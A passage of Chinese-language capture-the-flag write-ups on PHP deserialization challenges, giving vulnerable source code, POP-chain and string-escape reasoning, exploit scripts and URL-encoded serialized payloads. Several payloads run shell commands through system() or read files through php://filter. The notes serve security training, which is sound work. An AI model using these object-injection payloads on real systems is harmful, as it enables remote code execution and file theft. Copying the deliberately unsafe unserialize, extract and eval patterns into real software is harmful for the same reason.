    private $a;

    function __destruct() {
        $s = $this->a;
        $s($this->evil);
    }
}

class B {
    private $b;

    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}


 if(isset($_GET['data']))
 {
     $a = unserialize($_GET['data']);
 }
 else {
     highlight_file(__FILE__);
 }
```

思路：

> 1.私有变量用 __construct()，在创建时赋值，或者创建公有函数赋值
>
> 2.__invoke() 在对象被当作函数使用时调用
>

exp

```php
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil = "cat /flag";

    // 如何赋值呢
    private $a;

    public function __construct() {
        $this->a = new B();


    }
}

class B {
    private $b = "system";

}

$a = new A();
echo urlencode(serialize($a));
```

```php
?data=O%3A1%3A"A"%3A2%3A{s%3A7%3A"%00A%00evil"%3Bs%3A9%3A"cat+%2Fflag"%3Bs%3A4%3A"%00A%00a"%3BO%3A1%3A"B"%3A1%3A{s%3A4%3A"%00B%00b"%3Bs%3A6%3A"system"%3B}}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732845666789-03510e00-7a83-4386-b2b7-629d0b907aab.png)

## 
## [安洵杯 2019]easy_serialize_php1
```php
<?php

  // 获取通过GET方法传递的名为'f'的参数值，并抑制可能出现的错误提示（不建议在生产环境这样用，可能隐藏错误信息）
  $function = @$_GET['f'];

// 定义一个名为filter的函数，用于过滤特定字符串
function filter($img) {
  // 定义一个包含需要过滤的字符串的数组
  $filter_arr = array('php', 'flag', 'php5', 'php4', 'fl1g');
  // 使用implode函数将数组元素用'|'连接起来，构建一个正则表达式模式，用于匹配要过滤的字符串，'i'表示不区分大小写
  $filter = '/'.implode('|', $filter_arr).'/i';
  // 使用preg_replace函数按照定义的正则表达式模式对传入的字符串进行替换操作，将匹配到的字符串替换为空字符串
  return preg_replace($filter, '', $img);
}

// 如果存在$_SESSION变量，则销毁它（这里的逻辑有点奇怪，一般是先判断是否存在再使用）
if ($_SESSION) {
  unset($_SESSION);
}

// 设置$_SESSION["user"]的值为'guest'
$_SESSION["user"] = 'guest';
// 将通过GET方法获取到的'f'参数值赋给$_SESSION['function']
$_SESSION['function'] = $function;

// 从POST请求数据中提取变量并创建对应的变量（如果同名变量已存在可能会覆盖，存在安全风险）
extract($_POST);

// 如果没有通过GET方法传递'f'参数
if (!$function) {
  // 输出一个超链接，指向index.php并传递'f=highlight_file'参数，链接文本为'source_code'
  echo '<a href="index.php?f=highlight_file">source_code</a>';
}

// 如果没有通过GET方法传递'img_path'参数
if (!$_GET['img_path']) {
  // 将'guest_img.png'进行base64编码后的值赋给$_SESSION['img']
  $_SESSION['img'] = base64_encode('guest_img.png');
} else {
  // 如果传递了'img_path'参数，先对其进行base64编码，然后再进行SHA1哈希计算，将结果赋给$_SESSION['img']
  $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

// 对序列化后的$_SESSION数据进行过滤处理，调用前面定义的filter函数
$serialize_info = filter(serialize($_SESSION));

// 如果通过GET方法传递的'f'参数值为'highlight_file'
if ($function == 'highlight_file') {
  // 使用highlight_file函数输出index.php的源代码（一般用于调试目的）
  highlight_file('index.php');
} else if ($function == 'phpinfo') {
  // 使用eval函数执行phpinfo函数，用于输出PHP的相关配置信息等，这里使用eval存在安全风险，因为可以注入恶意代码
  eval('phpinfo();'); //maybe you can find something in here!
} else if ($function == 'show_image') {
  // 对经过过滤和序列化处理后的用户信息进行反序列化操作
  $userinfo = unserialize($serialize_info);
  // 使用file_get_contents函数读取并输出通过base64解码后的图片内容，这里读取的是根据前面逻辑设置在$_SESSION['img']中的图片相关数据
  echo file_get_contents(base64_decode($userinfo['img']));
}
```

相关函数：

+ **implode()：**

 把数组元素组合为字符串

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732714580703-3494abea-0b34-4fcb-99be-19730b17a0b3.png)

+ **extract()：**

将一组键值对转换为变量

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732714736779-8e06621b-007a-441c-b901-bf5098d2588a.png)

+ **file_get_contents()**

 把整个文件读入一个字符串中 

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732714967372-e00e5352-7163-4c44-9589-faaa59ce3a24.png)

搜集信息：

这里给了信息看一下

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732692823935-fa928c4d-611e-4487-ac93-e3e53274d358.png)

找到信息

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732692788058-12e02e61-3564-4cc5-92c9-afc1db569189.png)

解题思路

> 利用 file_get_contents() 函数来获取 flag(路径是 `<font style="color:#0000bb;">$userinfo</font><font style="color:#007700;">[</font><font style="color:#dd0000;">'img'</font><font style="color:#007700;">]</font>`<font style="color:#0000bb;"> </font><font style="color:#000000;">base64 </font>解码后的内容)<-使`<font style="color:#0000bb;">$function</font>`<font style="color:#0000bb;"> </font>值为 'show_image'
>

> 注意：
>
> `<font style="color:#0000bb;">$userinfo</font><font style="color:#007700;">[</font><font style="color:#dd0000;">'img'</font><font style="color:#007700;">]</font>`<font style="color:#0000bb;"> </font><font style="color:#000000;">是</font>`<font style="color:#0000bb;">$_SESSION</font>`<font style="color:#000000;">序列化过滤之后再反序列化得到，</font>
>
> `<font style="color:#0000bb;">$_SESSION</font>`<font style="color:#0000bb;"> </font><font style="color:#000000;">中 user 键的值是'guset', function 键的值是 get 传参 f 的值，img 键的值是 get 传参 img_path base64 编码 SHA1 计算哈希之后的值》</font>
>

> 其中 img 的值在传参之后经过两次编码，之后只有一次解码，这不对劲，而且这个过程很复杂
>
> 还记得上面提到的 extract()函数吗？我们直接利用这个函数传参不就行了
>

键值逃逸

```php
_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}
```

过滤前:

```php
a:3:{s:4:"user";s:23:"flagflagflagflagflagphp";s:8:"function";s:57:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
```

过滤后,为方便看,将同一个键值对放同一行了

```php
a:3:{
  s:4:"user";s:23:"";s:8:"function";s:57:"";
  s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}"// 需要的内容
  ;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}// 这些字符串逃逸了
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732807308197-46352845-2e46-4121-a728-da6c9287ecb4.png)

 将/d0g3_fllllllag进行base64编码后上传，可获得 flag  

```php
_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"1";s:1:"2";}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732807560061-1a0f94c2-b602-4411-b4ac-a05af8130f87.png)

键名逃逸

```php
_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

>  过滤前  
`a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`  
过滤后  
a:2:`{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`  
下面的步骤和值替换一样  
这里的键名变为`";s:48:` 实现了逃逸  
>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732808039213-a08de1b9-83df-4317-bfb1-be45f9445c8c.png)

## web1_此夜圆
```php
<?php
error_reporting(0);

class a
{
	public $uname;
	public $password;
	public function __construct($uname,$password)
	{
		$this->uname=$uname;
		$this->password=$password;
	}
	public function __wakeup()
	{
			if($this->password==='yu22x')
			{
				include('flag.php');
				echo $flag;	
			}
			else
			{
				echo 'wrong password';
			}
		}
	}

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```

这题就是典型的字符串增多类型了

明确构造的字符串

```php
";s:8:"password";s:5:"yu22x";}
```

长度是 30,已知一个 `Firebasky`提供的长度是 2

那么要写 15 个

构造 payload

```php
?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732878111845-90cc42d8-5f61-46e4-997d-4655972e723a.png)

## [MRCTF2020]Ezpop1
```php
 <?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

pop 链: Show::__wakeup()->Show::__tostring()->Test::__get()->Modifier::__invoke()

exp

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}


$a= new Show();
$file='index.php';
$a->source=new Show();
$a->source->str=new Test();
$a->source->str->p=new Modifier();

echo PHP_EOL.serialize($a).PHP_EOL;
echo urlencode(serialize($a)).PHP_EOL;
```

```php
?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732881105710-291b4ae3-db40-4fd8-8e58-76f1482655e3.png)

```php
PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezdjYTMyNWZlLWI5YTQtNDJhZi1hYzA5LWI3MGJmZTBhZGYyMX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8
```

解码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732881179381-f032262d-1eb5-4f67-b2f3-15ba3e8f427b.png)

## [2022DASCTF X SU 三月春季挑战赛]ezpop74
```php
 <?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }

}

if (isset($_POST['cmd'])) {
    unserialize($_POST['cmd']);
} else {
    highlight_file(__FILE__);
}
```

pop 链

fin::__destruct()->what::__toString()->mix::run()->crow::__invoke()->fin::__call()->mix::get_flag()

```php
<?php

class crow
{
    public $v1;
    public $v2;

//    function eval() {
//        echo new $this->v1($this->v2);
//    }
//
//    public function __invoke()
//    {
//        $this->v1->world();
//    }
}

class fin
{
    public $f1;

//    public function __destruct()
//    {
//        echo $this->f1 . '114514';
//    }
//
//    public function run()
//    {
//        ($this->f1)();
//    }
//
//    public function __call($a, $b)
//    {
//        echo $this->f1->get_flag();
//    }

}

class what
{
    public $a;

//    public function __toString()
//    {
//        $this->a->run();
//        return 'hello';
//    }
}
class mix
{
    public $m1='?><?php system("ls /")?>';

//    public function run()
//    {
//        ($this->m1)();
//    }
//
//    public function get_flag()
//    {
//        eval('#' . $this->m1);
//    }

}

//if (isset($_POST['cmd'])) {
//    unserialize($_POST['cmd']);
//} else {
//    highlight_file(__FILE__);
//}
//fin::__destruct()->what::__toString()->mix::run()->crow::__invoke()->fin::__call()->mix::get_flag()

$a = new fin();
$a->f1 = new what();
$a->f1->a = new mix();
$a->f1->a->m1 = new crow();
$a->f1->a->m1->v1 = new fin();
$a->f1->a->m1->v1->f1 = new mix();

echo serialize($a);
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732882918821-02261ee3-ead9-4433-b00f-f627d3218e90.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732882899479-f7a97f9c-f7a9-45a6-b913-37e3db822123.png)

之后查一下

```php
cmd=O:3:"fin":1:{s:2:"f1";O:4:"what":1:{s:1:"a";O:3:"mix":1:{s:2:"m1";O:4:"crow":2:{s:2:"v1";O:3:"fin":1:{s:2:"f1";O:3:"mix":1:{s:2:"m1";s:27:"?><?php system("cat /f*")?>";}}s:2:"v2";N;}}}}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732883168073-1aa28389-585c-426e-b0c2-1efcaa9be42a.png)

```php
cmd=O:3:"fin":1:{s:2:"f1";O:4:"what":1:{s:1:"a";O:3:"mix":1:{s:2:"m1";O:4:"crow":2:{s:2:"v1";O:3:"fin":1:{s:2:"f1";O:3:"mix":1:{s:2:"m1";s:25:"?><?php system("cat *")?>";}}s:2:"v2";N;}}}}
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732883276321-7b8f0270-a49c-4065-bdd1-c3bb866b2695.png)

